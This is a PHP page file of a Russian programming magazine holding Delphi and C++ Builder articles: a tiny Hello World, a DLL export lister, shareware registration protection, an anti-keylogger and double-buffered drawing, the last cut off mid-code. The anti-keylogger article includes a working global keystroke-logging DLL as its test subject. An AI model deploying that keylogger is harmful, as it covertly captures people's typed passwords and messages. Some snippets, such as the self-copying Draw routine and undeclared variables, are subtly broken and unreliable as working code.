<p>Сегодня мы напишем программу Hello World на Delphi 6. Обыкновенную программу, которая выводит сообщение с помощью MessageBox(). Отличие в том, что её размер будет отличаться от размера "обычных" программ на Делфи.</p>
<p>Приступим....</p>
<p>Вам понадобится блокнот и компилятор dcc32.exe, поставляемый в пакете Delphi (у меня он 14-ой версии). Откройте новый проект, закройте модуль Unit1, выберите Project->View Source. В появившемся окне удалите все лишнее и сохраните результат в отдельную папку. В папке должен появиться файл следующего содержания:</p>
<pre class="code">
program pr;
begin

end.
</pre>

<p>Чтобы скомпилировать этот файл вручную, скопируйте в эту же папку DCC32.EXE. Для автоматического компилирования создайте .BAT файл следующего содержания:</p>
<pre class="code">
Dcc32.Exe Bin\pr.dpr
pause
</pre>

<p>Запустив этот файл, Вы соберете проект. Но для сборки программы на Делфи необходимы еще два файла (модуля). Это SysInit.pas и System.pas, которые лежат в папке Delphi6\Source\Rtl\Sys\. Мы не будем их брать оттуда, а перепишем заново. Создайте в Вашем каталоге два файла с именами SysInit.pas и System.pas. Оставьте их "пустыми", то есть, запишите следующее:</p>
<pre class="code">
unit SysInit;
interface
implementation
end.

unit System;
interface
implementation
end.
</pre>

<p>.PAS файлы созданы, теперь создайте для них .DCU файлы. Для этого Вам понадобится следующий .BAT файл:</p>
<pre class="code">
dcc32 -q system -m -y -z -$D-
dcc32 -q sysinit -m -y -z -$D-
pause
</pre>

<p>Запустите его. Выпало сообщение о том, что не найдена процедура _HandleFinally. Видимо, она обязательно должна присутствовать. Хорошо, тогда подредактируйте файл System.pas следующим образом:</p>
<pre class="code">
unit System;

interface
procedure _HandleFinally;

implementation

procedure _HandleFinally;
begin
end;
end.
</pre>

<p>Скомпилируйте. Файл System.dcu создан, но появилась еще одна ошибка, касающаяся TGUID. Придется сделать объявление:</p>
<pre class="code">
unit System;

interface
procedure _HandleFinally;

type 
  TGUID = packed record
  end;

implementation

procedure _HandleFinally;
begin
end;

end.
</pre>

<p>Компиляция... Готово - появился и SysInit.dcu. Это хорошо, значит, можно компилировать и сам проект... Опять ошибка! На этот раз связанная с @InitExe. Его тоже надо объявить:</p>
<pre class="code">
unit System;

interface
procedure _HandleFinally;
procedure _InitExe;

type 
  TGUID = packed record
  end;

implementation

procedure _HandleFinally;
begin
end;

procedure _InitExe;
begin
end;

end.
</pre>

<p>Опять сборка... Готово! Скомпилируйте проект. Снова ошибка, на этот раз виноват @halt0. Исправьте:</p>
<pre class="code">
unit System;

interface
procedure _HandleFinally;
procedure _InitExe;
procedure _halt0;


type 
  TGUID = packed record
  end;

implementation

procedure _HandleFinally;
begin
end;

procedure _InitExe;
begin
end;

procedure _halt0;
begin
end;

end.
</pre>

<p>Сборка... Готово. Скомпилируйте пустой проект... Получился .EXE файл размером около 3,5 КБ. Попробуйте его запустить. Что такое? Программа не запускается! Чтобы узнать, в чем дело, придется немного изменить Ваши модули:</p>
<pre class="code">
unit System;

interface
procedure _HandleFinally;
procedure _InitExe;
procedure _halt0;


type 
  TGUID = packed record
  end;

implementation

procedure _HandleFinally;
begin
 asm 
   nop
 end
end;

procedure _InitExe;
begin
 asm 
   nop
   nop
 end
end;

procedure _halt0;
begin
 asm 
   nop
   nop
   nop
 end
end;

end.
</pre>

<p>После компиляции загрузите файл в OllyDbg:</p>
<br>
<div class="info">
004010C4 &gt; $55              PUSH EBP<br>
004010C5   .8BEC            MOV EBP, ESP<br>
004010C7   .83C4 F0         ADD ESP, -10<br>
004010CA   .B8 A4104000     MOV EAX, 004010A4<br>
004010CF   .E8 30FFFFFF     CALL 00401004<br>
004010D4   .E8 2FFFFFFF     CALL 00401008<br>
</div>

<p>Попав в 00401004, можно увидеть, что там находится _InitExe, а по адресу 00401008 - _halt0. Эти процедуры были оставлены пустыми, значит, придется либо их немного исправить, либо самостоятельно следить за выходом программы.</p>
<p>Вот он - Hello World!!!</p>
<pre class="code">
program pr;
function MessageBox(hWnd: LongWord;lpText, lpCaption: PChar;uType: LongWord): Integer;stdcall;external \'user32.dll\' name \'MessageBoxA\';
procedure ExitProcess(uExitCode: LongWord);stdcall; external \'kernel32.dll\' name \'ExitProcess\';

begin
   MessageBox(0, \'Hello World\', \'test\', 0);
   ExitProcess(0);
end.
</pre>

<p>Hello World выводится, размер программы - 3,5 КБ. Как бы ещё её уменьшить? Урежьте файл с помощью программы PE Optimizer от Dr.Golova и запакуйте с помощью FSG. В итоге получится программа размером 1,18 КБ - достаточно неплохой результат!</p>
<p>Удачи!</p>
';
	break;
//-------------------------------------------------------------------------------------------------------

case '0805/dllfunctions.html':
	$site['page']['title'] .= ' - Функции DLL';
	$site['page']['description'] .= ' Функции DLL';
	$site['page']['keywords'] .= ', Функции DLL';
	$site['page']['body'] = '<h1>Функции DLL</h1>
<b>Автор:</b> <a href="http://forum.sources.ru/index.php?showuser=3352"><i>x2er0</i></a>

<p>Часто появляется необходимость выяснить - какие функции экспортирует та или иная DLL. Вы скажете, что легко это сделать с помощью различных утилит, например: DumpBin или Dependency Walker ... Верно, но давайте попробуем сделать что-нибудь свое! Для этого нам необходимы кое-какие знания о PE-файлах. Но об этом в данной статье речь не пойдет, возможно, я напишу это как-нибудь в другой раз, а сейчас просто покажу пример того, как это можно сделать.</p>
<pre class="code">
{$A+,B-,C+,D+,E-,F-,G+,H+,I+,J-,K-,L+,M-,N+,O+,P+,Q-,R-,S-,T-,U-,V+,W-,X+,Y+,Z1}
{$MINSTACKSIZE $00004000}
{$MAXSTACKSIZE $00100000}
{$IMAGEBASE $00400000}
{$APPTYPE CONSOLE}
program pr;
  uses
  Windows,
  Dialogs,
  SysUtils;

Var
  ImageBase : DWord;
  DosHeader : PImageDosHeader;
  PeHeader  : PImageNtHeaders;
  PExport   : PImageExportDirectory;
  cmdline   : String;
  pname     : PDWord;
  name      : PChar;
  i         : Integer;

Procedure FatalOsError;
begin
  ShowMessage(SysErrorMessage(GetLastError( )));
  Abort;
end;


begin
  try
    If (ParamCount( ) < 1) Then
      Abort
    Else
      cmdline := ParamStr(1);

    ImageBase := GetModuleHandle(PChar(cmdline));
    If (ImageBase = 0) Then
    Begin
       ImageBase := LoadLibrary(PChar(cmdline));
       If (ImageBase = 0) Then FatalOsError;
    End;

    try
      DosHeader := PImageDosHeader(ImageBase);
      If (DosHeader^.e_magic <> IMAGE_DOS_SIGNATURE) Then
          FatalOsError;

      PEHeader := PImageNtHeaders(DWord(ImageBase) + DWord(DosHeader^._lfanew));
      If (PEHeader^.Signature <> IMAGE_NT_SIGNATURE) Then
          FatalOsError;

      PExport := PImageExportDirectory(ImageBase +
 DWord(PEHeader^.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress));
      pname   := PDWord(ImageBase + DWord(PExport^.AddressOfNames));

      For i := 0 To PExport^.NumberOfNames - 1 Do begin
        name := PChar(PDWord(DWord(ImageBase)  + PDword(pname)^));
        WriteLn(name);
        inc(pname);
      end;
    finally
      FreeLibrary(ImageBase);
    end;
  except
    Abort;
  end;
end.
</pre>

<p>Чтобы запустить программу, надо в качестве первого параметра командной строки передать имя DLL файла. В итоге в консоль выведутся имена функций.</p>
<p>Дополнения:</p>
<p>Таблицу экспорта можно найти с помощью функции function ImageDirectoryEntryToData(Base: Pointer; MappedAsImage: ByteBool; DirectoryEntry: Word; var Size: ULONG): Pointer; stdcall; external \'imagehlp.dll\';</p>
<p>Для примера давайте рассмотрим результат работы данной программы  на примере библиотеки - imagehlp.dll.</p>
<p>Запускаем с перенаправлением в файл:</p>
<p>pr imagehlp.dll > log_imagehlp.txt</p>
<p>В итоге получаем файл следующего содержания:</p>

<pre>
BindImage
BindImageEx
CheckSumMappedFile
EnumerateLoadedModules
EnumerateLoadedModules64
FindDebugInfoFile
FindDebugInfoFileEx
FindExecutableImage
FindExecutableImageEx
FindFileInPath
FindFileInSearchPath
GetImageConfigInformation
GetImageUnusedHeaderBytes
GetTimestampForLoadedLibrary
ImageAddCertificate
ImageDirectoryEntryToData
ImageDirectoryEntryToDataEx
ImageEnumerateCertificates
ImageGetCertificateData
ImageGetCertificateHeader
ImageGetDigestStream
ImageLoad
ImageNtHeader
ImageRemoveCertificate
ImageRvaToSection
ImageRvaToVa
ImageUnload
ImagehlpApiVersion
ImagehlpApiVersionEx
MakeSureDirectoryPathExists
MapAndLoad
MapDebugInformation
MapFileAndCheckSumA
MapFileAndCheckSumW
ReBaseImage
ReBaseImage64
RemovePrivateCvSymbolic
RemovePrivateCvSymbolicEx
RemoveRelocations
SearchTreeForFile
SetImageConfigInformation
SplitSymbols
StackWalk
StackWalk64
SymCleanup
SymEnumSourceFiles
SymEnumSym
SymEnumSymbols
SymEnumTypes
SymEnumerateModules
SymEnumerateModules64
SymEnumerateSymbols
SymEnumerateSymbols64
SymEnumerateSymbolsW
SymEnumerateSymbolsW64
SymFindFileInPath
SymFromAddr
SymFromName
SymFunctionTableAccess
SymFunctionTableAccess64
SymGetLineFromAddr
SymGetLineFromAddr64
SymGetLineFromName
SymGetLineFromName64
SymGetLineNext
SymGetLineNext64
SymGetLinePrev
SymGetLinePrev64
SymGetModuleBase
SymGetModuleBase64
SymGetModuleInfo
SymGetModuleInfo64
SymGetModuleInfoW
SymGetModuleInfoW64
SymGetOptions
SymGetSearchPath
SymGetSymFromAddr
SymGetSymFromAddr64
SymGetSymFromName
SymGetSymFromName64
SymGetSymNext
SymGetSymNext64
SymGetSymPrev
SymGetSymPrev64
SymGetTypeFromName
SymGetTypeInfo
SymInitialize
SymLoadModule
SymLoadModule64
SymMatchFileName
SymMatchString
SymRegisterCallback
SymRegisterCallback64
SymRegisterFunctionEntryCallback
SymRegisterFunctionEntryCallback64
SymSetContext
SymSetOptions
SymSetSearchPath
SymUnDName
SymUnDName64
SymUnloadModule
SymUnloadModule64
TouchFileTimes
UnDecorateSymbolName
UnMapAndLoad
UnmapDebugInformation
UpdateDebugInfoFile
UpdateDebugInfoFileEx
</pre>

<p>На этом все.</p>
<p>Удачи!</p>
';
	break;
//-------------------------------------------------------------------------------------------------------

case '0805/protection.html':
	$site['page']['title'] .= ' - Практика создания защиты';
	$site['page']['description'] .= ' Практика создания защиты.';
	$site['page']['keywords'] .= ', создания защиты';
	$site['page']['body'] = '<h1>Практика создания защиты</h1>
<b>Автор:</b> <a href="http://forum.sources.ru/index.php?showuser=15575"><i>Krott</i></a>

<p>Все хотят кроме удовольствия получать еще и деньги. Для каждого программиста создавать программы - удовольствие. Что же может быть лучше для него, чем продавать свои творения? Вообще я - сторонник бесплатности ПО, но в этой статье речь пойдёт не о деньгах. Я продолжу тему, начатую <a href="http://magazine/magazine/0105/protect_shareware.html">в одном из прошлых</a> выпусков журнала. Только на сей раз займёмся практической реализацией защиты. Надо сказать, я не стремлюсь написать сложную и совершенную защиту  - будем придерживаться принципа, что лучше направить силы в сторону улучшения программы. По сути дела, в этой статье я несколько улучшу защиту, написанную мной минут за двадцать для топика Игрушка для форума - Ломалки. Набросаю план, которого будем придерживаться по ходу размышлений.</p>

<ol>
 <li>Создание простой защиты.
  <ul>
   <li>ввод и проверка регистрационного кода</li>
   <li>маскировка</li>
   <li>отвлекающие маневры</li>
   <li>фичи</li>
  </ul>
 </li>
 <li>Надёжная защита и как её реализовать.
  <ul>
   <li>лучшие способы</li>
  </ul>
 </li>
</ol>

<h2>1. Создание простой защиты</h2>
<p>Здесь мы рассмотрим очень простой способ создания защиты, основанной на использовании регистрационного кода, а также способы улучшения этого метода.</p>

<h3>Ввод и проверка регистрационного кода</h3>
<p>Итак, у пользователя есть регистрационный код. Для того чтобы он смог его ввести, будем использовать стандартное окошко InputQuery, потом немного поюзаем реестр и сделаем проверку, нарушив тем самым все писаные и неписаные правила создания защит. Объясню смысл действий.</p>
<p>Бывает, что правильный регистрационный код хранят в реестре или в файле на винчестере, чтобы потом можно было сравнить его с введённым (ужас). Не будем долго думать и сделаем всё наоборот - после ввода запишем этот код в реестр, а далее так или иначе будем сравнивать его с эталоном.</p>
<p>Да, и тут же совершим абсолютно очевидную и предсказуемую проверку кода.</p>
<p>На данный момент у нас будет типичная для большинства shareware-программ защита. Я надеюсь, что негодяй-взломщик подумает так же. Он обнаружит обращения к реестру, увидит проверку, сгенерирует по ней регистрационный код и успокоится. Ну и хорошо. Для пущей уверенности поблагодарим его за успешную регистрацию.</p>
<p>Ниже привожу весь код, каким он должен быть на данный момент с подробными комментариями. В этот код желательно насовать разного мусора: ненужных проверок, возвращающих всегда одно и то же значение, математических операций,  в общем, всего, чего угодно. Здесь я, естественно, всё это опущу.</p>
<pre class="code" style="color: #000;">
<font color="#333399">//---------------------------------------------------------------------------</font>
<font color="#008800">
#include <vcl.h>
#include <Registry.hpp>
#include <cctype.h>
#pragma hdrstop

#include "Unit1.h"
</font>
<font color="#333399">//---------------------------------------------------------------------------</font>
<font color="#008800">#pragma package(smart_init)
#pragma resource "*.dfm"</font>
TForm1 *Form1;
AnsiString RegKey;
<font color="#333399">// далее идут восемь функций
// в них помимо мусора вызов Terminate
// это сделано, чтобы не вызывать одну функцию, которую можно заблокировать</font>
void Terminate1(){Application->Terminate();}
void Terminate2(){Application->Terminate();}
void Terminate3(){Application->Terminate();}
void Terminate4(){Application->Terminate();}
void Terminate5(){Application->Terminate();}
void Terminate6(){Application->Terminate();}
void Terminate7(){Application->Terminate();}
void Terminate8(){Application->Terminate();}
<font color="#333399">//---------------------------------------------------------------------------</font>
__fastcall TForm1::TForm1(TComponent* Owner)
        : TForm(Owner)
{
}
<font color="#333399">//---------------------------------------------------------------------------</font>

void __fastcall TForm1::FormCreate(TObject *Sender)
{
TRegistry *reg=new TRegistry;
if (!reg->OpenKey("Software\\MyProg\\Reg", false)){
<font color="#333399">//если первый запуск программы, то ключ надо создать</font>
reg->OpenKey("Software\\MyProg\\Reg", true);
reg->WriteString("RegKey", "");
}
<font color="#333399">//читаем значение</font>
RegKey=reg->ReadString("RegKey");
<font color="#333399">//выводим диалог</font>
if (RegKey=="" ||RegKey.Length()!=15){
if (!InputQuery("Registration", "Type the registration code", RegKey))
rcode-=77;
}
<font color="#333399">//начинаем проверку</font>
char *first=AnsiString(RegKey.SubString(1, 1)).c_str();
if (isalpha(*first))
rcode+=89;
else
Terminate1();

if (RegKey.SubString(2, 3)=="R14")
rcode/=4;
else
Terminate2();

char *second=AnsiString(RegKey.SubString(5, 1)).c_str();
if (isdigit(*second))
rcode-=15;
else
Terminate3();

if (RegKey.SubString(12, 1)=="6")
rcode*=2;
else
Terminate4();

if (RegKey.SubString(13, 1)=="R" || RegKey.SubString(13, 1)=="E" || RegKey.SubString(13, 1)=="G")
rcode/=13;
else
Terminate5();

if (RegKey.SubString(14, 1)=="0" || RegKey.SubString(14, 1)=="5" || RegKey.SubString(14, 1)=="8")
rcode+=41;
else
Terminate6();

if (RegKey.SubString(15, 1)=="B")
rcode-=1;
else
Terminate7();
<font color="#333399">//записываем введённое в реестр</font>
reg->WriteString("RegKey", RegKey);}
<font color="#333399">//---------------------------------------------------------------------------</font>
</pre>

<h3>Маскировка</h3>
<p>Итак, у нас есть одна абсолютно очевидная проверка. Мы её афишируем, как можем: пишем в реестр, делаем ненужные операции. Теперь хорошо бы создать ещё одну (две, три, а может и больше - зависит от желания) проверок. Их надо замаскировать как можно тщательнее, можно, например, закосить под обработку исключительных ситуаций. Как реализовать эти проверки - решать вам, я приведу лишь простенький примерчик:</p>
<pre class="code" style="color: #000;">
void __fastcall TForm1::Button1Click(TObject *Sender)
{
<font color="#333399">//проверка по алгоритму
//среднее арифметическое шести цифр кода с 6-ой по 11-ую
// должно делиться на пять</font>
int summ=0;
<font color="#333399">// здесь я сделал двойной цикл, чтобы запутать взломщика
//главное самому не запутаться
//мы складываем шесть цифр из регистрационного кода
//эту операцию проводим шесть раз
// а когда вычисляем среднее арифметическое - делим не на 6, а на 36
//с учётом второго цикла</font>
for (int j=0; j<6; j++){
for (int i=0; i<6; i++){
summ+=StrToInt(RegKey.SubString(i+6, 1));
}
}
if ((summ/36)%5==0)
<font color="#333399">// запомните, что когда мы делим два числа типа int, то частное
//округляется к меньшему целому</font>
summ+=45;
else{
Application->MessageBoxA("Error during loading the resource. Ask the author about the error # 14", "Error!", MB_OK);
return;
<font color="#333399">// здесь я сделал очень примитивно, ничто не мешает просто поставить здесь брекпойнт
// надо сделать заковыристее
// хотя бы так же, как в первой проверке</font>
}
}
//---------------------------------------------------------------------------
</pre>

<p>Разумнее выставить этот код на открытие файла, если вы пишете редактор, тогда в незарегистрированной версии эта функция работать не будет. Да и, конечно, алгоритм проверки желательно усовершенствовать.</p>

<h3>Отвлекающие маневры</h3>
<p></p>
<p>Надо как-то отвлекать хакера, сводить его с правильного пути взлома. Возможно, на опытных это и не подействует, но от новичков оградит. Вы можете использовать любую чушь, которая в данном месте программы кажется бессмысленной и привлекает на себя внимание. Итак, рассмотрим несколько отвлекающих методов.</p>

<p><u>Бесполезные расчёты.</u></p>
<p>Среди такого мусора порой бывает очень сложно рассчитать правильный регистрационный код, так что пренебрегать использованием этого метода не стоит.</p>

<p><u>Используем цикл.</u></p>
<p>Его желательно разместить сразу после вызова InputQuery. В цикл можно поместить код, производящий какие-либо действия над паролем, многократные обращения к реестру, вызовы API-функций, это всё реально сможет спрятать за собой дополнительные проверки кода.</p>

<p><u>Копируем код.</u></p>
<p>После ввода хорошо бы скопировать его в несколько переменных. Для нас это абсолютно бессмысленно, но взломщика должно отвлечь.</p>
<p></p>
<p>Вообще можно придумать ещё много всякого, оставлю это на ваше усмотрение.</p>

<h3>Фичи</h3>
<p>Существует множество способов, с помощью которых можно реально осложнить жизнь взломщику. Я познакомлю вас с некоторыми из них:</p>

<p><u>Защита от крэкерского софта.</u></p>
<p>Если на компьютере пользователя, использующего программу, установлены SoftIce, IDA, HIEW или WinHEX, RegMon, FileMon, APIMon,  Restorator,  ImpRec и другие специальные утилиты, это наводит на мысль, что  программу нашу хотят немного поломать. Поэтому нужно срочно прикрыть лавочку. Опытных крэкеров это не остановит, но проблемы им создаст.</p>
<p><i>Реализация:</i></p>
<p>Для начала, надо узнать, что эти программы установлены на компьютере пользователя. Как это сделать? Можно искать их на жёстком диске - довольно медленно. Лучше обнаружить их по ключам в реестре - это будет намного быстрее, или отлавливать во время исполнения запущенные приложения по таймеру. В Интернете много примеров обнаружения запущенного хакерского софта. Я видел даже компонент, предназначенный для поиска в реестре этих программ, но, к сожалению, он был платным.</p>
<p></p>

<p><u>Защита от взлома методом String Reference.</u></p>
<p>String Reference - достаточно распространённый метод взлома. Заключается он в следующем: в уже откомпилированной программе содержатся строки "Unregistered version", "Trial" и так далее. Взломщики (особенно начинающие) дизассемблируют прогу и ищут такие строки. Далее смотрят, откуда они вызываются, пара изменений ассемблерного кода и программа сломана.</p>
<p><i>Как защититься?</i></p>
<p>Загружать все строки из файла.</p>
<p><i>Реализация.</i></p>
<p>Реализуется достаточно просто, хотя желательно, чтобы эти строки хранились вдобавок в зашифрованном виде.</p>
<p></p>

<p><u>Проверка CRC.</u></p>
<p>Это защитит от пропатчивания программы. Можно проверять по таймеру, или в определённых местах.</p>
<p><i>Реализация.</i></p>
<p>Проблем с реализацией возникнуть не должно, примеров в сети много (один из вариантов предложен в ФАКе по С++ Builder на <a href="http://forum.sources.ru/" title="Форум на Исходниках.Ру">форуме</a>).</p>
<p></p>

<p><u>Использование архиваторов.</u></p>
<p>ASPack и PEPack, если вы хотите создать качественную защиту, не прокатят. Уже давно научились их распаковывать (например, утилитой ASPackDie). Выход один - писать свой собственный хитроумный упаковщик. При хорошей реализации это может сильно осложнить процесс взлома.</p>
<p></p>

<h2>2. Надёжная защита и как её реализовать</h2>
<p>Безусловно, описанный мной способ даже после всевозможных улучшений никак не претендует на звание устойчивой защиты. Поэтому сейчас я расскажу о лучших способах защиты.</p>

<h3>Лучшие способы</h3>

<p><u>Необратимое шифрование пароля.</u></p>
<p>Алгоритм прост. После ввода пароля шифруем его необратимым шифрованием, а затем так или иначе сравниваем его с прошитыми в программу шаблонами.</p>
<p>[+] При хорошей реализации пароль можно подобрать только брутфорсом.</p>
<p>[(] Правильные пароли для раздачи пользователям и вам придётся искать перебором.</p>
<p></p>

<p><u>Шифрование кода.</u></p>
<p>Можно хранить часть кода в программе зашифрованной. После ввода пароля - расшифровывать им этот код. Если пароль правильный, то программа будет работать нормально, в противном случае - с ошибками.</p>
<p>[+][(] Плюсы и минусы налицо. У того способа, который я описал в статье и у этих двух есть один общий жирный минус.</p>
<p>Он заключается в том, что эти защиты потеряют смысл после разглашения хотя бы одного правильного пароля / регистрационного ключа.</p>
<p>Поэтому, для того чтобы сделать защиту устойчивой, необходимо добавить в неё либо привязку к железу, либо метод активации.</p>
<p></p>

<p><u>Привязка к железу.</u></p>
<p>Довольно неудачный способ. Создаёт довольно много проблем как разработчику, так и пользователю.</p>
<p>[+] Теперь одну и ту же копию программы можно установить только на один компьютер.</p>
<p>[(] Если пользователь наметил апгрейд, это грозит и для него и для вас неудобствами.</p>
<p></p>

<p><u>Система активации.</u></p>
<p>Алгоритм такой:</p>
<p>1) Пользователь регистрируется, платит денежки и получает регистрационный код. Мы записываем его данные в такую, приблизительно, базу:</p>
<br>
<table border="0" width="100%" cellspacing="0" cellpadding="5">
 <tr>
  <td width="18%" align="center" class="c1">Имя</td>
  <td width="18%" align="center" class="c1">Фамилия</td>
  <td width="20%" align="center" class="c1">E-mail</td>
  <td width="24%" align="center" class="c1">Регистрационный код</td>
  <td width="20%" align="center" class="c1">Активация</td>
 </tr>
</table>

<p>Здесь, в поле <b>Регистрационный код</b> мы записываем выданный ему регистрационный код, а в поле <b>Активация</b> оставляем значение <b>false</b> до тех пор, пока он не активирует свою копию. То есть, при регистрации запишем false.</p>
<p>2) Пользователь активирует свою копию, то есть указывает полученный регистрационный код (можно вдобавок при регистрации выдавать пароль, по которому точно его авторизируем). После этого в поле <b>Активация</b> надо записать <b>true</b>. Больше использовать этот регистрационный код никто не сможет, то есть если даже взломщик подберёт правильные ключи, то некоторые из них будут уже недоступны, а остальные - в единичном экземпляре.</p>
<p>[+] Гарантирует наиболее полную защиту при хорошей реализации.</p>
<p>[(] Громоздкий способ, хотя его можно сократить только до первого этапа. Нужен хостинг с PHP и базой данных. Необходимо следить ещё и за безопасностью сайта.</p>

<h2>Заключение</h2>
<p>Я не рассказал вам о способе защиты аппаратным ключом. Это довольно сложный и требующий затрат способ, поэтому мы его и не касаемся.</p>
<p>Свою прогу я продвигаю как бесплатный продукт. Но если когда-нибудь подумаю продавать её за деньги, то для защиты я, скорее всего, выберу именно способ активации, как наиболее надёжный.</p>

<p style="text-align: right;"><b>Krott.</b></p>
';
	break;
//-------------------------------------------------------------------------------------------------------

case '0805/antikeylogger.html':
	$site['page']['title'] .= ' - Охота за шпионом, или АнтиКейлоггер';
	$site['page']['description'] .= ' Охота за шпионом, или АнтиКейлоггер';
	$site['page']['keywords'] .= ', АнтиКейлоггер';
	$site['page']['body'] = '<h1>Охота за шпионом, или АнтиКейлоггер</h1>
<b>Автор:</b> <a href="http://forum.sources.ru/index.php?showuser=3352"><i>x2er0</i></a>

<p>Сегодня мы рассмотрим, как с помощью DLL перекрыть кислород обыкновенному KeyLogerr\'у, работающему на основе SetWindowsHookEx. Для начала напишем простенький KL:</p>
<pre class="code">
library kl;

Uses
   Windows
   ,Messages
   ;

Var
  hook:HHook = 0;

Procedure WriteLog(const log: PChar);
 Var
   hFile: THandle;
   dwError: DWord;
   buf: array[0..1] of Char;
   dwWritten: DWord;
 Begin
   hFile := CreateFile(PChar(\'kl\'), GENERIC_WRITE, 0, nil, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
   Try
     If (hFile <> INVALID_HANDLE_VALUE) Then
     Begin
       dwError := SetFilePointer(hFile, 0, nil, FILE_END);
       If (dwError <> $FFFFFFFF) Then
       Begin
          WriteFile(hFile, log^, length(log), dwWritten, nil);
          buf[0] := #13;
          buf[1] := #10;
          WriteFile(hFile, buf, 2, dwWritten, nil);
       End;
     End;
   Finally
     CloseHandle(hFile);
   End;
 End;

Function HookProc(nCode: LongInt; wParam, lParam: LongInt): LongInt stdcall;
 Var
   lpszName: Array[0..255] Of Char;
 Begin
    If (nCode = HC_ACTION) And ((lParam shr 31) = 1) Then
    Begin

       GetKeyNameText(lParam, @lpszName, $FF);
       WriteLog(PChar(@lpszName));

    End;
    Result := CallNextHookEx(Hook, nCode, wParam, lParam);
 End;


procedure sethook(flag:bool);export; stdcall;
begin
 if flag then
    hook := SetWindowsHookEx(WH_KEYBOARD, @HookProc, hInstance, 0)
 else
   begin
    unhookwindowshookex(hook);
    hook:=0;
   end;
end;

exports sethook;

begin
end.
</pre>

<p>Он записывает имена всех нажатых клавиш в указанный файл. Этого достаточно для проверки и написания АнтиКейлоггера.</p>
<p>Приступим...</p>
<p>Что будет представлять собой наш AKL? Все просто. Это будет такое же .EXE приложение, устанавливающее Hook с помощью SetWindowsHookEx и использующее DLL. Единственное отличие в том, что хук будет устанавливаться не на WH_KEYBOARD, а на WH_DEBUG. Вот и все.</p>
<p>Напишем:</p>
<pre class="code">
library akl;

Uses
   Windows
   ;

Var
  hook:HHook = 0;

Function DebugProc(nCode: LongInt; wParam, lParam: LongInt): LongInt stdcall;
Begin
    If (nCode = HC_ACTION) Then
    Begin

       If (wParam = WH_KEYBOARD) Then
       Begin
          Result := 1;
          Exit;
       End;

    End;
    Result := CallNextHookEx(Hook, nCode, wParam, lParam);
End;


procedure sethook(flag:bool);export; stdcall;
begin
 if flag then
    hook := SetWindowsHookEx(WH_DEBUG, @DebugProc, hInstance, 0)
 else
   begin
    unhookwindowshookex(hook);
    hook:=0;
   end;
end;

exports sethook;

begin
end.
</pre>

<p>Особенность в том, что мы, поймав wParam = WH_KEYBOARD, устанавливаем Result := 1 и выходим без передачи управления на другую ловушку (CallNextHookEx).</p>
<p>Это самые простые КейЛоггер и АнтиКейлоггер. Но я буду рад, если они кому-то пригодятся!</p>
<p>Удачи!!!</p>
';
	break;
//-------------------------------------------------------------------------------------------------------

case '0805/surfaces.html':
	$site['page']['title'] .= ' - Создание поверхностей';
	$site['page']['description'] .= ' Создание поверхностей';
	$site['page']['keywords'] .= ', Создание поверхностей';
	$site['page']['body'] = '<h1>Создание поверхностей</h1>
<b>Автор:</b> <a href="http://forum.sources.ru/index.php?showuser=15089"><i>OSokin</i></a>

<p>Многие, кто знаком с OpenGL и DirectX, знают, что они используют сначала одну поверхность, затем программист их "переключает". Но и у OpenGL, и у DirectX есть недостатки, особенно при создании двухмерного приложения:</p>
<ol>
 <li>Они требуют свои библиотеки;</li>
 <li>Они увеличивают размер исполняемого файла;</li>
 <li>Они сложны в использовании для новичков.</li>
</ol>

<p>И так далее. Но многие просто не знают, как сделать подобное "переключение" поверхностей, и из-за этого используют их. Для тех, кто этого не знает, и написана эта статья.</p>
<p>Добавим в область uses модуль Windows. Только один модуль, и тот стандартный - это означает, что размер программы практически не увеличится.</p>
<p></p>
<p>Теперь займемся секцией var. Добавим в нее две переменные:</p>
<pre class="code">
var
  Back: HDC; //Задняя поверхность
  BackB: HBitmap; //Битмап для нее


Все, что требуется для создания "многоповерхностности", - еще один DC и процедура BitBlt. Вот как это делается:

procedure Init(Front: HDC; Width, Height: Integer);
begin
  //Создаем поверхность
  Back := CreateCompatibleDC(Front);
  //Создаем битмап для нее (многие останавливаются именно здесь - они не знают, что надо создавать еще и битмап)
  BackB := CreateCompatibleBitmap(Front, Width, Height);
  //Выбираем этот битмап
  SelectObject(Back, BackB);
  //Устанавливаем размеры
  SetBitmapDimensionEx(BackB, Width, Height,nil);
end;

procedure DeInit;
begin
  //Удаляем битмап
  DeleteObject(BackB);
  //Удаляем поверхность
  DeleteDC(Back);
end;

procedure SetSize(Width, Height: Integer);
begin
  //Удаляем битмап
  DeleteObject(BackB);
  //Создаем новый, с новыми размерами
  BackB := CreateCompatibleBitmap(Front, Width, Height);
  //Выбираем этот битмап
  SelectObject(Back, BackB);
  //Устанавливаем размеры
  SetBitmapDimensionEx(BackB, Width, Height,nil);
end;

procedure Draw(Front: HDC);
var
  Sizes: SIZE;
begin
  GetBitmapDimensionEx(BackB, Sizes);
  BitBlt(Front, 0, 0, Sizes.cx, Sizes.cy, Front, 0, 0, SRCCOPY);
end;
</pre>

<p>Вот и все. Сначала надо инициализировать, потом рисовать на поверхности Back (если используете VCL, то можете создать Canvas, указав ей в качестве Handle этот Back), затем вызываете Draw, поставив параметром тот DC, на который надо рисовать (или сами это делаете, через BitBlt) и, когда уже не надо поверхность, вызываете DeInit. Чтобы узнать размеры поверхности, вызываете GetBitmapDimensionEx(BackB, ваша_переменная), а чтобы установить их - SetSize.</p>
<p>Да, чуть не забыл. Намного легче оформить это в виде компонента, что я и сделал:</p>
<pre class="code">
unit FreeDraw;

interface

uses Windows;

type
  TFDSurface = class
  private
    dc: HDC; //Передняя поверхность
    dc2: HDC; //Задняя поверхность
    dc2b: HBitmap; //Описатель задней поверхности (как Bitmap)
    fWidth,fHeight: Integer; //Размеры поверхности
    //Общая процедура изменения размеров
    procedure ChangeSize(Width, Height: Integer);
  protected
    //Процедура изменения ширины
    procedure ChangeWidth(Value: Integer);
    //Процедура изменения высоты
    procedure ChangeHeight(Value: Integer);
  public
    //Конструктор
    constructor Create(Window: HWnd; DCWidth, DCHeight: Integer);
    //Деструктор
    destructor Destroy;
    //Процедура вывода задней поверхности на переднюю
    procedure Draw;
  published
    //Ширина
    property Width: Integer read fWidth write ChangeWidth;
    //Высота
    property Height: Integer read fHeight write ChangeHeight;
    //Идентификатор задней поверхности
    property SDC: HDC read dc2;
  end;

implementation

//--- TFDSurface ---//

//Коструктор
constructor TFDSurface.Create(Window: HWnd; DCWidth, DCHeight: Integer);
begin
  //Выполняем действия базового конструктора
